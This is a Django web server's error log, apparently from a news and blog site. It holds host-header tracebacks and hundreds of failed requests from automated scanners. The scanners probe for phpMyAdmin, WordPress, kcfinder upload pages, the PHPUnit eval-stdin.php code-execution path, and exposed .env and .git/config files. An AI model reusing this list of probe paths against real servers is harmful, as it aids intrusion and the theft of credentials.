  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '192.168.14.21'. You may need to add '192.168.14.21' to ALLOWED_HOSTS.
Bad Request: /
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /.env
Not Found: /php-my-admin/index.php
Not Found: /phpMyAdmin6/index.php
Not Found: /db/webdb/index.php
Not Found: /sql/phpmyadmin5/index.php
Not Found: /mysql/index.php
Not Found: /db/index.php
Not Found: /phpMyAdmin-latest-english/index.php
Not Found: /db/phpmyadmin/index.php
Not Found: /sql/phpmyadmin4/index.php
Not Found: /phpmyadmin3/index.php
Not Found: /phpmyadmin2022/index.php
Not Found: /phpmyadmin_/index.php
Not Found: /db/websql/index.php
Not Found: /sql/phpmy-admin/index.php
Not Found: /mysql/db/index.php
Not Found: /mysqlmanager/index.php
Not Found: /sql/sql-admin/index.php
Not Found: /_phpMyAdmin/index.php
Not Found: /administrator/PMA/index.php
Not Found: /phpmyAdmin/index.php
Not Found: /phppma/index.php
Not Found: /sql/sql/index.php
Not Found: /administrator/phpMyAdmin/index.php
Not Found: /dbadmin/index.php
Not Found: /phpMyAdmin-5.2.1-all-languages/index.php
Not Found: /sql/phpmyadmin3/index.php
Not Found: /phpMyAdmin1/index.php
Not Found: /db/phpmyadmin3/index.php
Not Found: /phpmyadmin2018/index.php
Not Found: /program/index.php
Not Found: /db/dbadmin/index.php
Not Found: /phpMyAdmin_/index.php
Not Found: /mysql/dbadmin/index.php
Not Found: /sql/websql/index.php
Not Found: /mysql/admin/index.php
Not Found: /phpMyAdmin-5.2/index.php
Not Found: /phpmy-admin/index.php
Not Found: /phpMyAdmin-4.9.10-all-languages/index.php
Not Found: /1phpmyadmin/index.php
Not Found: /phpMyAdmin-5.2.0/index.php
Not Found: /mysql/pMA/index.php
Not Found: /sql/phpMyAdmin2/index.php
Not Found: /phpMyAdmin/index.php
Not Found: /mysqladmin/index.php
Not Found: /mysql/mysqlmanager/index.php
Not Found: /db/dbweb/index.php
Not Found: /db/phpMyAdmin-5/index.php
Not Found: /db/db-admin/index.php
Not Found: /phpMyAdmin-5.1.0/index.php
Not Found: /index.php
Not Found: /phpmyadmin2021/index.php
Not Found: /phpMyAdmin-latest-all-languages/index.php
Not Found: /phpMyAdmin-5.1.1/index.php
Not Found: /phpMyAdmin-5/index.php
Not Found: /mysql/sqlmanager/index.php
Not Found: /sql/phpmanager/index.php
Not Found: /sql/webadmin/index.php
Not Found: /phpMyAdmin-5.2.0-all-languages/index.php
Not Found: /database/index.php
Not Found: /mysql-admin/index.php
Not Found: /phpMyAdmin2/index.php
Not Found: /sql/php-myadmin/index.php
Not Found: /administrator/pma/index.php
Not Found: /db/phpmyadmin4/index.php
Not Found: /MyAdmin/index.php
Not Found: /phpMyAdmin-5.1.2/index.php
Not Found: /mysql/pma/index.php
Not Found: /phpMyAdmin-4.9.7/index.php
Not Found: /administrator/admin/index.php
Not Found: /phpMyAdmin4/index.php
Not Found: /phpmyadmin/index.php
Not Found: /phpmyadmin5/index.php
Not Found: /phpMyAdmin-5.2.1-english/index.php
Not Found: /sql/phpMyAdmin/index.php
Not Found: /phpmy/index.php
Not Found: /db/phpMyAdmin3/index.php
Not Found: /pma/index.php
Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
Not Found: /phpmyadmin2019/index.php
Not Found: /sql/sqladmin/index.php
Not Found: /sql/webdb/index.php
Not Found: /php-myadmin/index.php
Not Found: /mysql/web/index.php
Not Found: /administrator/web/index.php
Not Found: /sql/sqlweb/index.php
Not Found: /db/phpMyAdmin/index.php
Not Found: /phpMyAdmin3/index.php
Not Found: /__phpmyadmin/index.php
Not Found: /phpmyadmin2/index.php
Not Found: /sql/myadmin/index.php
Not Found: /db/webadmin/index.php
Not Found: /phpMyAdmin6.0/index.php
Not Found: /phpMyAdmin-3/index.php
Not Found: /phpmyadmin4/index.php
Not Found: /phpMyadmin/index.php
Not Found: /phpmyadmin1/index.php
Not Found: /2phpmyadmin/index.php
Not Found: /phpMyAdmin-4/index.php
Not Found: /_phpmyadmin_/index.php
Not Found: /db/phpMyAdmin-3/index.php
Not Found: /phpmyadmin2017/index.php
Not Found: /shopdb/index.php
Not Found: /phpMyAdmin5.1/index.php
Not Found: /PMA/index.php
Not Found: /sqlmanager/index.php
Not Found: /phpmyadmin6/index.php
Not Found: /phpmyadmin2020/index.php
Not Found: /db/phpmyadmin5/index.php
Not Found: /phpMyAdmin5.2/index.php
Not Found: /db/myadmin/index.php
Not Found: /phpMyAdmin5/index.php
Not Found: /myadmin/index.php
Not Found: /administrator/db/index.php
Not Found: /db/phpMyAdmin-4/index.php
Not Found: /administrator/phpmyadmin/index.php
Not Found: /phpMyAdmin-latest/index.php
Not Found: /_phpmyadmin/index.php
Not Found: /phpMyAdmin-5.1.3/index.php
Not Found: /phpMyAdmin-5.2.1/index.php
Not Found: /contact.html
Not Found: /index.html
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /robots.txt
Not Found: /youtube-video-downloader/contact.html/
Not Found: /json/wallet.json
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /ckeditor/kcfinder/upload.php
Not Found: /kcfinder/upload.php
Not Found: /assets/kcfinder/upload.php
Not Found: /webboard/plugins/editors/kcfinder/upload.php
Not Found: /ckeditor/plugins/kcfinder/upload.php
Not Found: /admin-panel/vendor/kcfinder/upload.php
Not Found: /assets/plugin/kcfinder/upload.php
Not Found: /plugins/kcfinder/upload.php
Not Found: /vendor/kcfinder/upload.php
Not Found: /painel/kcfinder/upload.php
Not Found: /panel/kcfinder/upload.php
Not Found: /yonetim/engine/ckeditor/kcfinder/upload.php
Not Found: /assets/admin/js/kcfinder/upload.php
Not Found: /js/kcfinder/upload.php
Not Found: /upload/kcfinder/upload.php
Not Found: /site/plugins/kcfinder/upload.php
Not Found: /assets/js/kcfinder/upload.php
Not Found: /app/libraries/kcfinder/upload.php
Not Found: /modules/kcfinder/upload.php
Not Found: /lib/kcfinder/upload.php
Not Found: /uploads/kcfinder/upload.php
Not Found: /storage/app/kcfinder/upload.php
Not Found: /inc/kcfinder/upload.php
Not Found: /assets/ckeditor/kcfinder/upload.php
Not Found: /resources/kcfinder/upload.php
Not Found: /modules/admin/editor/kcfinder/upload.php
Not Found: /system/kcfinder/upload.php
Not Found: /assets/admin/plugins/kcfinder/upload.php
Not Found: /en/kcfinder/upload.php
Not Found: /plugin/ckeditor/kcfinder/upload.php
Not Found: /data/kcfinder/upload.php
Not Found: /core/kcfinder/upload.php
Not Found: /files/kcfinder/upload.php
Not Found: /modules/ckeditor/kcfinder/upload.php
Not Found: /plugin/kcfinder/upload.php
Not Found: /system/libraries/kcfinder/upload.php
Not Found: /foo/kcfinder/upload.php
Not Found: /bar/kcfinder/upload.php
Not Found: /test/kcfinder/upload.php
Not Found: /tmp/kcfinder/upload.php
Not Found: /secret/kcfinder/upload.php
Not Found: /logs/kcfinder/upload.php
Not Found: /config/kcfinder/upload.php
Not Found: /private/kcfinder/upload.php
Not Found: /data/uploads/kcfinder/upload.php
Not Found: /images/kcfinder/upload.php
Not Found: /uploads/cache/kcfinder/upload.php
Not Found: /assets/css/kcfinder/upload.php
Not Found: /upload/images/kcfinder/upload.php
Not Found: /img/kcfinder/upload.php
Not Found: /filemanager/kcfinder/upload.php
Not Found: /storage/kcfinder/upload.php
Not Found: /uploads/files/kcfinder/upload.php
Not Found: /gallery/kcfinder/upload.php
Not Found: /vendor/assets/kcfinder/upload.php
Not Found: /uploads/images/kcfinder/upload.php
Not Found: /files/docs/kcfinder/upload.php
Not Found: /assets/kcfinder/src/
Not Found: /data/files/kcfinder/upload.php
Not Found: /includes/kcfinder/upload.php
Not Found: /resources/views/kcfinder/upload.php
Not Found: /upload/files/kcfinder/upload.php
Not Found: /cache/kcfinder/upload.php
Not Found: /uploads/uploadfiles/kcfinder/upload.php
Not Found: /library/kcfinder/upload.php
Not Found: /system/assets/kcfinder/upload.php
Not Found: /js/ckeditor/kcfinder/upload.php
Not Found: /data/upload/kcfinder/upload.php
Not Found: /tmp/cache/kcfinder/upload.php
Not Found: /lib/ckeditor/kcfinder/upload.php
Not Found: /data/file/kcfinder/upload.php
Not Found: /js/libs/kcfinder/upload.php
Not Found: /files/data/kcfinder/upload.php
Not Found: /css/kcfinder/upload.php
Not Found: /plugins/ckeditor/kcfinder/upload.php
Not Found: /upload/images/uploads/kcfinder/upload.php
Not Found: /site/ckeditor/kcfinder/upload.php
Not Found: /assets/css/admin/kcfinder/upload.php
Not Found: /public/kcfinder/upload.php
Not Found: /upload/uploads/kcfinder/upload.php
Not Found: /cache/images/kcfinder/upload.php
Not Found: /app/assets/kcfinder/upload.php
Not Found: /assets/cms/kcfinder/upload.php
Not Found: /uploads/uploads/uploads/kcfinder/upload.php
Not Found: /css/admin/kcfinder/upload.php
Not Found: /uploads/files/files/kcfinder/upload.php
Not Found: /upload/images/images/kcfinder/upload.php
Not Found: /uploads/data/kcfinder/upload.php
Not Found: /uploads/images/upload/kcfinder/upload.php
Not Found: /uploads/images/files/kcfinder/upload.php
Not Found: /uploads/data/files/kcfinder/upload.php
Not Found: /ckeditor/kcfinder/upload.phpkcfinder/upload.php
Not Found: /assets/kcfinder/upload.phpckeditor/
Not Found: /uploads/upload/kcfinder/upload.php
Not Found: /fileuploads/kcfinder/upload.php
Not Found: /uploads/images/images/uploads/kcfinder/upload.php
Not Found: /uploads/upload/upload/kcfinder/upload.php
Not Found: /uploads/files/uploads/kcfinder/upload.php
Not Found: /assets/ckeditor/plugins/kcfinder/upload.php
Not Found: /uploads/images/upload/images/kcfinder/upload.php
Not Found: /uploads/images/files/uploads/kcfinder/upload.php
Not Found: /uploads/images/uploadfiles/kcfinder/upload.php
Not Found: /uploads/files/upload/images/kcfinder/upload.php
Not Found: /uploads/images/files/upload/kcfinder/upload.php
Not Found: /robots.txt
Not Found: /device.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /actuator/gateway/routes
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /libs/js/iframe.js
Not Found: /device.rsp
Not Found: /wp-includes/ID3/license.txt
Not Found: /feed/
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /2021/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /webui/
Not Found: /device.rsp
Not Found: /geoserver/web/
Not Found: /device.rsp
Not Found: /robots.txt
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /xmlrpc.php
Not Found: /contact.html
Not Found: /index.html
Not Found: /.git/config
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/index.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/contact.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/index.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/contact.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/index.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/index.html
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/contact.html
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/index.html
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/contact.html
Not Found: /contact/index.html
Not Found: /contact/contact.html
Not Found: /Blogs/index.html
Not Found: /Blogs/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /Blogs/index.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/index.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/contact.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/index.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/contact.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/index.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/contact.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/index.html
Not Found: /news/imran-suspects-a-plot-behind-constitutional-court-proposal/contact.html
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/index.html
Not Found: /index.html
Not Found: /contact.html
Not Found: /youtube-video-downloader/index.html/
Not Found: /youtube-video-downloader/contact.html/
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/index.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/contact.html
Not Found: /blogs/login-form-in-vbnet-with-sql/index.html
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /Blogs/contact.html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/contact.html
Not Found: /contact/index.html
Not Found: /contact/contact.html
Not Found: /Blogs/index.html
Not Found: /Blogs/contact.html
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/index.html
Not Found: /contact/contact.html
Not Found: /contact/index.html
Not Found: /youtube-video-downloader/index.html/
Not Found: /youtube-video-downloader/contact.html/
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/index.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/contact.html
Not Found: /blogs/login-form-in-vbnet-with-sql/index.html
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /robots.txt
Not Found: /.git/config
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/contact.html
Not Found: /robots.txt
Not Found: /news/the-us-fed-cut-interest-rates-by-more-than-expected-so-what/index.html
Not Found: /device.rsp
Not Found: /.env
Not Found: /device.rsp
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /robots.txt
Not Found: /index.html
Not Found: /device.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /contact.html
Not Found: /device.rsp
Not Found: /helpdesk/WebObjects/Helpdesk.woa
Not Found: /app/config/.git/config
Not Found: /app/resources/.git/config
Not Found: /config_files/.git/config
Not Found: /data/config/.git/config
Not Found: /public/.git/config
Not Found: /.git/config
Not Found: /logs/current/.git/config
Not Found: /logs/temp/.git/config
Not Found: /releases/.git/config
Not Found: /repo/.git/config
Not Found: /sandbox/.git/config
Not Found: /server/.git/config
Not Found: /app/frontend/.git/config
Not Found: /modules/auth/.git/config
Not Found: /staging_environment/.git/config
Not Found: /api/.git/config
Not Found: /build_tool/.git/config
Not Found: /dev/backup/.git/config
Not Found: /images/.git/config
Not Found: /lib/js/.git/config
Not Found: /project/frontend/.git/config
Not Found: /staging_area/.git/config
Not Found: /temp/.git/config
Not Found: /modules/db/.git/config
Not Found: /scripts/.git/config
Not Found: /test_environment/.git/config
Not Found: /user_panel/.git/config
Not Found: /v1/.git/config
Not Found: /build/.git/config
Not Found: /data/processing/.git/config
Not Found: /lib/.git/config
Not Found: /media../.git/config
Not Found: /staging/.git/config
Not Found: /core/config/.git/config
Not Found: /data/staging/.git/config
Not Found: /scripts/dev/.git/config
Not Found: /src/.git/config
Not Found: /test_configs/.git/config
Not Found: /v3/.git/config
Not Found: /app/.git/config
Not Found: /core/.git/config
Not Found: /production/.git/config
Not Found: /public_html/.git/config
Not Found: /templates/.git/config
Not Found: /app/dev/.git/config
Not Found: /files/.git/config
Not Found: /static../.git/config
Not Found: /v2/.git/config
Not Found: /ci/cd/.git/config
Not Found: /data/.git/config
Not Found: /project/.git/config
Not Found: /www/.git/config
Not Found: /user_area/.git/config
Not Found: /user_backend/.git/config
Not Found: /backup/.git/config
Not Found: /deploy/.git/config
Not Found: /logs/archived/.git/config
Not Found: /config/.git/config
Not Found: /dev/.git/config
Not Found: /.env
Not Found: /ci/.git/config
Not Found: /cms/.git/config
Not Found: /docker/.git/config
Not Found: /lib/python/.git/config
Not Found: /modules/.git/config
Not Found: /prod/.git/config
Not Found: /data/private/.git/config
Not Found: /modules/api/.git/config
Not Found: /test/.git/config
Not Found: /user/.git/config
Not Found: /dashboard/.git/config
Not Found: /infra/.git/config
Not Found: /integration/.git/config
Not Found: /tools/.git/config
Not Found: /client/.git/config
Not Found: /devops/.git/config
Not Found: /modules/utils/.git/config
Not Found: /prod/config/.git/config
Not Found: /project/backend/.git/config
Not Found: /server/backup/.git/config
Not Found: /device.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /robots.txt
Not Found: /device.rsp
Not Found: /device.rsp
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /device.rsp
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /youtube-video-downloader/contact.html/
Not Found: /device.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /device.rsp
Not Found: /api/bin/123123
Not Found: /api/bin/123123
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /_profiler/phpinfo
Not Found: /debug/default/view
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /robots.txt
Not Found: /device.rsp
Not Found: /robots.txt
Not Found: /_profiler/phpinfo
Not Found: /device.rsp
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /device.rsp
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /device.rsp
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /device.rsp
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /containers/json
Not Found: /device.rsp
Not Found: /youtube-video-downloader/index.html/
Not Found: /device.rsp
Not Found: /libs/js/iframe.js
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /device.rsp
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /sql/websql/index.php
Not Found: /phpmyadmin2/index.php
Not Found: /phpMyAdmin2/index.php
Not Found: /mysql/sqlmanager/index.php
Not Found: /1phpmyadmin/index.php
Not Found: /phpMyadmin/index.php
Not Found: /administrator/admin/index.php
Not Found: /db/webadmin/index.php
Not Found: /phpMyAdmin-latest-english/index.php
Not Found: /db/phpMyAdmin-5/index.php
Not Found: /phpMyAdmin6/index.php
Not Found: /mysql/index.php
Not Found: /phpmyadmin2019/index.php
Not Found: /mysql/admin/index.php
Not Found: /mysql/web/index.php
Not Found: /sql/webdb/index.php
Not Found: /__phpmyadmin/index.php
Not Found: /phpMyAdmin-3/index.php
Not Found: /db/phpmyadmin4/index.php
Not Found: /phpmyadmin6/index.php
Not Found: /db/index.php
Not Found: /db/phpMyAdmin-3/index.php
Not Found: /phpMyAdmin-5.1.2/index.php
Not Found: /phpMyAdmin-5.2.1/index.php
Not Found: /sql/webadmin/index.php
Not Found: /phpMyAdmin-5.1.3/index.php
Not Found: /phpMyAdmin3/index.php
Not Found: /administrator/PMA/index.php
Not Found: /sql/phpMyAdmin2/index.php
Not Found: /phpmyadmin4/index.php
Not Found: /phpmyadmin_/index.php
Not Found: /phpMyAdmin-4.9.7/index.php
Not Found: /mysql/pma/index.php
Not Found: /phpmyAdmin/index.php
Not Found: /sql/sql/index.php
Not Found: /sql/sqladmin/index.php
Not Found: /phpMyAdmin5/index.php
Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
Not Found: /db/dbweb/index.php
Not Found: /phpMyAdmin-5.2.0-all-languages/index.php
Not Found: /php-my-admin/index.php
Not Found: /_phpmyadmin_/index.php
Not Found: /phpmyadmin2020/index.php
Not Found: /mysql/pMA/index.php
Not Found: /db/websql/index.php
Not Found: /sql/php-myadmin/index.php
Not Found: /phpMyAdmin-5.2.1-english/index.php
Not Found: /sql/phpmyadmin3/index.php
Not Found: /phpMyAdmin5.1/index.php
Not Found: /phpMyAdmin1/index.php
Not Found: /db/phpmyadmin/index.php
Not Found: /phpMyAdmin-4/index.php
Not Found: /phpmyadmin5/index.php
Not Found: /db/phpmyadmin3/index.php
Not Found: /mysqladmin/index.php
Not Found: /sql/phpMyAdmin/index.php
Not Found: /shopdb/index.php
Not Found: /phpMyAdmin-latest-all-languages/index.php
Not Found: /administrator/phpMyAdmin/index.php
